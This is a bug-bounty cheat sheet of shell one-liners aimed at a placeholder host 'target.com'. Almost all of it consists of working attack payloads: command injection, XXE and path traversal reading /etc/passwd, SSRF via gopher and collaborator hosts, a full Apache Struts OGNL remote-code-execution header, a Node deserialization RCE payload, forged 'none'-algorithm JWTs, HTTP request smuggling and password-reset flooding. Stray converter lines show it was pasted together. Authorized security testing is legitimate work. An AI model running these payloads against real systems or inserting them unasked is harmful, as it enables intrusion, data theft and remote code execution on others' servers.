```bash
curl -I https://target.com | grep Server
```

**Find Exposed GitHub Actions Secrets**  
```bash
gh api repos/target/repo/actions/secrets
```

**Test Blind XSS via User-Agent**  
```bash
curl -A "<script>alert(document.domain)</script>" https://target.com/
```

**Test for PHP Info Disclosure**  
```bash
curl -s https://target.com/phpinfo.php
```

**Exposed Kubernetes Dashboard via Proxy**  
```bash
curl -k https://target.com/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/
```

**GraphQL Schema Discovery**  
```bash
curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}'
```

**Check for Exposed AWS Lambda Function**  
```bash
curl -s https://target.com/.netlify/functions/
```

**Sensitive Parameter Fuzzing**  
```bash
ffuf -u https://target.com/?FUZZ=test -w params.txt
```

**Detect Misconfigured CORS**  
```bash
curl -I -H "Origin: https://evil.com" https://target.com
```

**Check for Weak JWT Tokens (None Algorithm)**  
```bash
curl -s https://target.com/api -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
```

**Exposed .env Files (Sensitive Config)**  
```bash
curl -s https://target.com/.env
```

**Sensitive GitHub Issues (Bug Bounty Targets)**  
```bash
gh issue list --repo target/repo --search "security"
```

**Exposed Internal IP Disclosure via Headers**  
```bash
curl -I https://target.com | grep -i 'x-originating-ip\|x-forwarded-for'
```

**Reverse Proxy Bypass Tricks**  
```bash
curl -I https://target.com/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
```

**Check for SSRF via Open Redirects**  
```bash
curl "https://target.com/redirect?url=http://burpcollaborator.net"
```

**Check for Command Injection in Parameters**  
```bash
curl "https://target.com/ping?host=127.0.0.1;id"
```

**Test for XML External Entity (XXE)**  
```bash
curl -X POST https://target.com/upload -d '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
```

**Test for Server-Side Template Injection (SSTI)**  
```bash
curl "https://target.com/render?template={{7*7}}"
```

**Sensitive File Leak Check (.DS_Store, .bak)**  
```bash
curl -I https://target.com/.DS_Store
```

**DNS Takeover Discovery**  
```bash
host -t cname sub.target.com
```

**Test for Misconfigured CORS (Wildcard Origin)**  
```bash
curl -I -H "Origin: https://evil.com" https://target.com
```

**Directory Traversal with Double Encoding**  
```bash
curl "https://target.com/download?file=%252E%252E%252F%252E%252E%252Fetc%252Fpasswd"
```

**Check for Exposed Configuration Files**  
```bash
curl -s https://target.com/wp-config.php
```

**Find Environment Variables in Responses**  
```bash
curl -s https://target.com | grep -E 'AWS_ACCESS_KEY|DB_PASSWORD'
```

**Check for Misconfigured Security Headers**  
```bash
curl -I https://target.com | grep -i "X-Frame-Options\|Content-Security-Policy\|Strict-Transport-Security"
```

Here's the converted content:

**Test for Gopher SSRF**  
```bash
curl "https://target.com/?url=gopher://127.0.0.1:6379/_INFO"
```

**Open Admin Panels Discovery**  
```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,aspx
```

**Exposed Docker API**  
```bash
curl -s http://target.com:2375/containers/json
```

**Check for Log Injection**  
```bash
curl "https://target.com/login?username=%0a%0dINJECTEDLOG&password=test"
```

**Test for Prototype Pollution**  
```bash
curl "https://target.com/api?__proto__[polluted]=true"
```

**Exposed Backup Files via Common Extensions**  
```bash
curl -I https://target.com/index.php~
```

**Check for Arbitrary File Read (Java Web Apps)**  
```bash
curl -s https://target.com/admin/..;/WEB-INF/web.xml
```

**Check for Error-Based SQL Injection**  
```bash
curl "https://target.com/product?id=1'"
```

**Check for Misconfigured Exposed GitLab/GitHub Pages**  
```bash
curl -I https://target.com/.gitlab-ci.yml
```

**Find Public S3 Buckets in JavaScript Files**  
```bash
curl -s https://target.com/app.js | grep "s3.amazonaws.com"
```

**Test for Apache Struts RCE (Legacy)**  
```bash
curl -X POST -H "Content-Type: %{(#_=‘multipart/form-data’).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=‘id’).(#iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds=(#iswin?{‘cmd.exe’,‘/c’,#cmd}:{‘/bin/sh’,‘-c’,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}" https://target.com/upload.action
```

**Detect Java Deserialization (CommonsCollections)**  
```bash
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @exploit.ser https://target.com/upload
```

**Exposed Jenkins Console**  
```bash
curl -s https://target.com/script
```

**Insecure Cookie Handling Check**  
```bash
curl -I https://target.com | grep -i Set-Cookie
```

### 💻 Ultimate Bug Bounty One-Liners - Part 4

**Find API Endpoints Directly from Web Responses**  
```bash
curl -s https://target.com | grep -oE 'https?://[^"]+/api/[^"]+' | sort -u
```

**Find Hardcoded Secrets in JS Files**  
```bash
curl -s https://target.com/app.js | grep -E "apikey|token|password|secret|client_id"
```

**Detect GraphQL Endpoints Automatically**  
```bash
curl -I https://target.com/graphql
```

**Test for Insecure Deserialization via JSON**  
```bash
curl -X POST https://target.com/api/v1/process -H "Content-Type: application/json" -d '{"user":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}'
```

**Detect AWS Keys Leaked in Source**  
```bash
curl -s https://target.com/app.js | grep -E "AKIA[0-9A-Z]{16}"
```

**Check for Insecure Direct Object Reference (IDOR)**  
```bash
curl "https://target.com/api/v1/users/1234" -b "session=your_cookie_here"
```
*Change 1234 to 1233 or 1235 and see if you access other user data.*

**Test for JWT None Algorithm Vulnerability**  
```bash
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-' | tr -d '\n' | xargs -I % curl -H "Authorization: Bearer %.eyJ1c2VyIjoiYWRtaW4ifQ." https://target.com/api/private
```

**Find Sensitive Pages via Archive.org**  
```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | grep -E "backup|admin|.sql|.env|.git"
```
Here is the converted list:

**Test for Server-Side Request Forgery (Advanced)**  
```bash
curl "https://target.com/api/fetch?url=http://burpcollaborator.net"
```

**Auto-Scan for CVEs (Nuclei FTW)**  
```bash
nuclei -u https://target.com -t cves/
```

**Detect Prototype Pollution in Query Strings**  
```bash
curl "https://target.com/api?__proto__[exploit]=polluted"
```

**Test for Cache Poisoning**  
```bash
curl -H "X-Forwarded-Host: evil.com" https://target.com
```

**Find Misconfigured S3 Buckets via Subdomains**  
```bash
host -t cname files.target.com | grep amazonaws
```

**Check for HTTP Parameter Pollution (HPP)**  
```bash
curl "https://target.com/login?user=admin&user=guest"
```

**Test for Open S3 Buckets Directly**  
```bash
aws s3 ls s3://target-bucket-name --no-sign-request
```

**Search for Exposed GitHub Tokens in Source**  
```bash
curl -s https://target.com/app.js | grep -E 'ghp_[a-zA-Z0-9]{36}'
```

**Test for Business Logic Bypass (Rate Limit)**  
```bash
for i in {1..100}; do curl -X POST https://target.com/api/v1/reset-password; done
```

**Detect Information Disclosure via Debug Headers**  
```bash
curl -I https://target.com | grep -i "debug\|x-powered-by\|server"
```

**Detect Unsafe Cross-Origin Resource Sharing (CORS)**  
```bash
curl -I -H "Origin: https://evil.com" https://target.com
```

**Auto-Find Secrets in Git Repos (GitLeaks)**  
```bash
gitleaks detect --source=https://github.com/target/repo.git
```

**Detect Open Redirect via Path Injection**  
```bash
curl "https://target.com/redirect?next=//evil.com"
```

**Find Subdomain Takeover with Subfinder + Nuclei**  
```bash
subfinder -d target.com | nuclei -t takeover/
```

**Test for SOAP Injection (If SOAP API Detected)**  
```bash
curl -X POST https://target.com/soap -d '<?xml version="1.0"?><soap:Envelope><soap:Body><exploit><![CDATA[1 or 1=1]]></exploit></soap:Body></soap:Envelope>'
```

**Detect Weak JWT Secrets (Bruteforce)**  
```bash
jwt-tool eyJhbGciOiJ... --brute --wordlist=/usr/share/wordlists/rockyou.txt
```

**Exposed ENV Files via .env**  
```bash
curl -s https://target.com/.env
```

**Check for Cloud Metadata Exposure (AWS/GCP/Azure)**  
```bash
curl -H "Host: 169.254.169.254" https://target.com
```

**Detect Command Injection via Parameter Fuzzing**  
```bash
curl 'https://target.com/ping?ip=127.0.0.1;id'
```

**Test for Fast Redirect Bypass (Open Redirect)**  
```bash
curl "https://target.com/redirect?url=//evil.com"
```

**Detect Path Traversal in Parameters**  
```bash
curl "https://target.com/api/v1/files?path=../../../../etc/passwd"
```

**Look for Exposed Kubernetes Dashboard**  
```bash
curl -I https://target.com/k8s/
```

**Find Rate Limit Issues in Password Reset API**  
```bash
seq 1 100 | xargs -I % -P 20 curl -X POST https://target.com/api/v1/reset
```

**Test HTTP Smuggling with CRLF Injection**  
```bash
printf "GET / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n\r\n" | nc target.com 80
```

**Detect Client-Side Storage Leaks (localStorage/sessionStorage)**  
```bash
curl -s https://target.com/app.js | grep -i "localStorage\|sessionStorage"
```

**Check for Blind SSRF via PDF Generation**  
```bash
curl -X POST https://target.com/api/generate-pdf -d '{"url":"http://your-collaborator.burpcollaborator.net"}'
```
